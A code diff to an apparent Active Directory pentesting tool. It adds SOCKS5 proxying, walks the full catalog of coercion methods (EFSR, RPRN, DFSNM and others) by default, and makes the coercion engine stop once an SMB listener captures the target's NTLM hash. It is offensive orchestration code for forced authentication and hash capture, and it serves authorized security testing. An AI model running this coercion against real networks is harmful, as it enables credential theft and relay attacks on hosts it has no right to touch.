@@ -10,6 +10,17 @@ The listener is the native ``SMBNtlmCaptureSource`` from
 ``services.relay.smb_ntlm_capture``; this module wraps it behind a
 synchronous ``start()/stop()/wait_for_capture()`` interface for callers that
 are not running on an asyncio event loop.
+
+Stop-on-real-capture seam
+-------------------------
+The listener runs on its own background asyncio loop in a dedicated thread; the
+native coercion trigger runs synchronously on the calling thread (via
+``run_async_sync``). Because the two run concurrently, the listener can confirm
+a REAL inbound NTLM capture *while* the coercion catalog is still being walked.
+``NativeListenerCapture.make_capture_signal()`` returns a thread-safe predicate
+that the coercion engine polls between attempts: the moment a matching capture
+lands, the engine stops walking the catalog. This is the only authoritative
+stop condition - a clean RPC return never ends the run.
 """
 
 from __future__ import annotations
@@ -26,6 +37,7 @@ import threading
 from aiosmb.commons.connection.factory import SMBConnectionFactory
 
 from adscan_internal.services.async_bridge import run_async_sync
+from adscan_internal.services.coercion.core import CaptureSignal
 from adscan_internal.services.coercion.runner import (
     NativeCoercionRunConfig,
     run_native_coercion,
@@ -33,6 +45,58 @@ from adscan_internal.services.coercion.runner import (
 
 
 RunCommand = Callable[..., subprocess.CompletedProcess[str] | None]
+
+
+def build_socks5_proxies(proxy_spec: str | None) -> list | None:
+    """Build a single-hop SOCKS5 proxy list from a ``host:port`` string.
+
+    Returns ``None`` when ``proxy_spec`` is empty so callers can pass the
+    result straight through to ``SMBConnectionFactory.from_components(...,
+    proxies=...)`` without changing behaviour when no proxy is requested.
+
+    The proxy ``endpoint_ip``/``endpoint_port`` are intentionally left unset:
+    the asysocks client fills them from the connection target at connect time
+    when a single proxy is configured. Only ``server_ip``/``server_port``/
+    ``protocol`` are required here.
+
+    Args:
+        proxy_spec: A ``host:port`` SOCKS5 endpoint (e.g. ``127.0.0.1:1080``),
+            or ``None``/empty to disable proxying.
+
+    Returns:
+        A one-element list of ``UniProxyTarget`` for the native stack, or
+        ``None`` when no proxy was requested.
+
+    Raises:
+        ValueError: When ``proxy_spec`` is non-empty but not ``host:port``.
+    """
+
+    spec = str(proxy_spec or "").strip()
+    if not spec:
+        return None
+
+    from asysocks.unicomm.common.proxy import (  # noqa: PLC0415
+        UniProxyProto,
+        UniProxyTarget,
+    )
+
+    host, sep, port_text = spec.rpartition(":")
+    if not sep or not host.strip() or not port_text.strip():
+        raise ValueError(
+            f"Invalid SOCKS5 proxy specification (expected host:port): {spec!r}"
+        )
+    try:
+        port = int(port_text.strip())
+    except ValueError as exc:
+        raise ValueError(
+            f"Invalid SOCKS5 proxy port in specification: {spec!r}"
+        ) from exc
+
+    proxy = UniProxyTarget()
+    proxy.server_ip = host.strip()
+    proxy.server_port = port
+    proxy.protocol = UniProxyProto.CLIENT_SOCKS5_TCP
+    return [proxy]
 
 
 def looks_like_ntlm_hash(value: str) -> bool:
@@ -128,8 +192,16 @@ class NativeCoercionTrigger:
         method_filter: str | None = None,
         use_kerberos: bool = False,
         env: dict[str, str] | None = None,
+        proxies: list | None = None,
+        capture_signal: CaptureSignal | None = None,
     ) -> NativeCoercionExecution:
-        """Execute native coercion and return subprocess-like metadata."""
+        """Execute native coercion and return subprocess-like metadata.
+
+        ``capture_signal`` is the authoritative stop condition forwarded to the
+        coercion engine: when it reports a real inbound capture the engine stops
+        walking the catalog. When ``None`` the engine walks the whole ordered
+        catalog and stops only on timeout.
+        """
 
         del env
         command = _native_trigger_command(
@@ -153,6 +225,8 @@ class NativeCoercionTrigger:
                     dc_ip=dc_ip,
                     method_filter=method_filter,
                     use_kerberos=use_kerberos,
+                    proxies=proxies,
+                    capture_signal=capture_signal,
                 )
             )
         except Exception as exc:  # noqa: BLE001 - converted to structured probe result
@@ -167,28 +241,33 @@ class NativeCoercionTrigger:
             )
 
         summary = (
-            f"native coercion success={result.success} attempts={result.attempts} "
+            f"native coercion captured={result.captured} attempts={result.attempts} "
             f"timed_out={result.timed_out}"
         )
-        if result.success:
-            first = result.successful_results[0]
-            summary += f" method={first.protocol}/{first.method_name}"
-        else:
+        if result.captured and result.probable_results:
+            first = result.probable_results[-1]
+            summary += f" probable_method={first.protocol}/{first.method_name}"
+        elif not result.captured:
             failures = [
-                f"{attempt.protocol}/{attempt.method_name}:{attempt.error or attempt.error_code or 'failed'}"
+                f"{attempt.protocol}/{attempt.method_name}:{attempt.error or attempt.error_code or 'no-capture'}"
                 for attempt in result.results[:5]
             ]
             if failures:
-                summary += " failures=" + "; ".join(failures)
+                summary += " attempts_detail=" + "; ".join(failures)
 
+        # ``returncode == 0`` means the coercion engine ran to completion (or
+        # was stopped by a real capture). Capture confirmation is owned by the
+        # listener, not by this returncode, so it is not gated on
+        # ``result.captured`` - the workflow reads the listener queue for the
+        # authoritative verdict.
         return NativeCoercionExecution(
             auth_mode="kerberos" if use_kerberos else "smb",
             command=command,
-            returncode=0 if result.success else 1,
+            returncode=0,
             stdout=summary,
             stderr="",
-            error_kind=None if result.success else "coercion_not_triggered",
-            error_detail=None if result.success else summary,
+            error_kind=None,
+            error_detail=None,
         )
 
 
@@ -231,6 +310,8 @@ async def _run_native_coercion_trigger(
     dc_ip: str | None,
     method_filter: str | None,
     use_kerberos: bool,
+    proxies: list | None = None,
+    capture_signal: CaptureSignal | None = None,
 ):
     secret_type = "nt" if looks_like_ntlm_hash(secret) else "password"
     # When Kerberos auth is requested, aiosmb derives the ``cifs/<target>`` SPN
@@ -252,6 +333,7 @@ async def _run_native_coercion_trigger(
         domain=domain,
         dcip=dc_ip or target,
         authproto="kerberos" if use_kerberos else "ntlm",
+        proxies=proxies,
     )
     protocols, method_names = _native_filter_from_method(method_filter)
     return await run_native_coercion(
@@ -261,9 +343,9 @@ async def _run_native_coercion_trigger(
             listener_host=listener_ip,
             listener_auth_type="http" if auth_type.lower() == "http" else "smb",
             timeout_seconds=float(timeout_seconds),
-            stop_on_first_success=True,
             protocols=protocols,
             method_names=method_names,
+            capture_signal=capture_signal,
             show_summary=False,
         ),
     )
@@ -272,9 +354,18 @@ async def _run_native_coercion_trigger(
 def _native_filter_from_method(
     method_filter: str | None,
 ) -> tuple[tuple[str, ...], tuple[str, ...]]:
+    """Translate an operator ``--method`` filter into engine selectors.
+
+    With no filter the run walks the ENTIRE ordered catalog (empty protocol
+    tuple = no protocol restriction), so vectors like MS-RPRN that coerce a
+    single-homed member are always attempted. The previous default narrowed to
+    EFSR+RPRN only, which - combined with the false-positive early stop - meant
+    the run frequently never reached RPRN.
+    """
+
     candidate = str(method_filter or "").strip()
     if not candidate:
-        return ("EFSR", "RPRN"), ()
+        return (), ()
     normalized = candidate.upper().replace("MS-", "")
     if normalized in {"EFSR", "RPRN", "DFSNM", "FSRVP", "EVEN"}:
         return (normalized,), ()
@@ -315,6 +406,11 @@ class NativeListenerCapture:
     that runs the async ``SMBNtlmCaptureSource`` on a background asyncio event
     loop in a dedicated thread and bridges captured NTLM observations to a
     ``threading.Queue`` for synchronous consumption.
+
+    Every observation is also recorded in a thread-safe side buffer so
+    :meth:`make_capture_signal` can report a real capture live (while the
+    coercion trigger is still walking the catalog) without consuming from the
+    ``wait_for_capture`` queue.
     """
 
     exit_returncode: int | None = None
@@ -334,6 +430,11 @@ class NativeListenerCapture:
         self._stop_event: asyncio.Event | None = None
         self._source: object | None = None
         self._inbound: InboundConnectionSummary = InboundConnectionSummary()
+        # Live, thread-safe record of every observation seen so far, used by
+        # ``make_capture_signal`` for stop-on-real-capture. Independent of the
+        # consume queue so the final ``wait_for_capture`` still drains normally.
+        self._observed_lock = threading.Lock()
+        self._observed: list[NtlmCaptureObservation] = []
 
     def connection_stats(self) -> InboundConnectionSummary:
         """Return the inbound-connection tally observed by the listener.
@@ -350,6 +451,47 @@ class NativeListenerCapture:
             except Exception:  # noqa: BLE001 - never let observability raise
                 return self._inbound
         return self._inbound
+
+    def drain_observations(self) -> list[NtlmCaptureObservation]:
+        """Return a thread-safe snapshot of every observation seen so far.
+
+        Additive read-only accessor for the shared-listener fan-out pattern: a
+        single listener collects captures from many concurrent coercion
+        triggers, and the caller attributes each observation to its coerced host
+        by matching ``clean_user`` to the expected ``<host>$`` computer account.
+        Reuses the same ``_observed`` buffer that backs
+        :meth:`make_capture_signal` without consuming the
+        :meth:`wait_for_capture` queue, so the single-target probe path is
+        unaffected. Safe to call while the listener is running and after
+        :meth:`stop`.
+        """
+
+        with self._observed_lock:
+            return list(self._observed)
+
+    def make_capture_signal(
+        self, expected_usernames: Iterable[str] | None = None
+    ) -> CaptureSignal:
+        """Return a thread-safe predicate that is True once a REAL capture lands.
+
+        The predicate matches the same ``expected_usernames`` filter the final
+        :meth:`wait_for_capture` uses (empty filter = accept any principal), so
+        the coercion engine stops only on a capture the workflow would attribute
+        to the target - never on a clean RPC return.
+        """
+
+        expected = _normalize_expected_usernames(expected_usernames or [])
+
+        def _signal() -> bool:
+            with self._observed_lock:
+                observed = tuple(self._observed)
+            for obs in observed:
+                if expected and obs.clean_user.casefold() not in expected:
+                    continue
+                return True
+            return False
+
+        return _signal
 
     def clear_database(self) -> None:
         """No-op — native listener has no persistent state to clear."""
@@ -418,14 +560,15 @@ class NativeListenerCapture:
                     if result.domain and result.username
                     else (result.username or "")
                 )
-                self._capture_queue.put(
-                    NtlmCaptureObservation(
-                        raw_user=raw_user,
-                        clean_user=result.username or "",
-                        ntlm_version=result.ntlm_version,
-                        fullhash=result.fullhash,
-                    )
+                observation = NtlmCaptureObservation(
+                    raw_user=raw_user,
+                    clean_user=result.username or "",
+                    ntlm_version=result.ntlm_version,
+                    fullhash=result.fullhash,
                 )
+                with self._observed_lock:
+                    self._observed.append(observation)
+                self._capture_queue.put(observation)
         finally:
             try:
                 self._inbound = _to_inbound_summary(source.connection_stats)
@@ -484,11 +627,18 @@ def run_ntlm_capture_probe(
     trigger_env: dict[str, str] | None = None,
     dc_ip: str | None = None,
     method_filter: str | None = None,
+    proxies: list | None = None,
     listener_ready_delay_seconds: float = 2.0,
     post_trigger_wait_seconds: float = 2.0,
     sleep_fn: Callable[[float], None] = time.sleep,
 ) -> NtlmCaptureProbeResult:
-    """Run a coercion-to-capture probe and classify the observed NTLM auth type."""
+    """Run a coercion-to-capture probe and classify the observed NTLM auth type.
+
+    The coercion trigger walks the entire ordered method catalog, but is handed
+    a ``capture_signal`` bound to the listener so it stops the instant a REAL
+    inbound NTLM capture matching ``expected_usernames`` is observed. The
+    listener queue then yields the authoritative observation for classification.
+    """
 
     if not listener.start():
         return NtlmCaptureProbeResult(
@@ -512,9 +662,11 @@ def run_ntlm_capture_probe(
     trigger_result: NativeCoercionExecution | None = None
     trigger_error_kind: str | None = None
     trigger_error_detail: str | None = None
+    expected_list = list(expected_usernames)
     try:
         listener.clear_database()
         sleep_fn(max(listener_ready_delay_seconds, 0.0))
+        capture_signal = listener.make_capture_signal(expected_list)
         trigger_execution = trigger.run(
             target=target,
             listener_ip=listener_ip,
@@ -527,6 +679,8 @@ def run_ntlm_capture_probe(
             env=trigger_env,
             dc_ip=dc_ip,
             method_filter=method_filter,
+            proxies=proxies,
+            capture_signal=capture_signal,
         )
         trigger_command = trigger_execution.command
         trigger_result = trigger_execution
@@ -535,7 +689,7 @@ def run_ntlm_capture_probe(
         sleep_fn(max(post_trigger_wait_seconds, 0.0))
         observation = listener.wait_for_capture(
             timeout_seconds=capture_timeout_seconds,
-            expected_usernames=expected_usernames,
+            expected_usernames=expected_list,
         )
     finally:
         listener.stop()
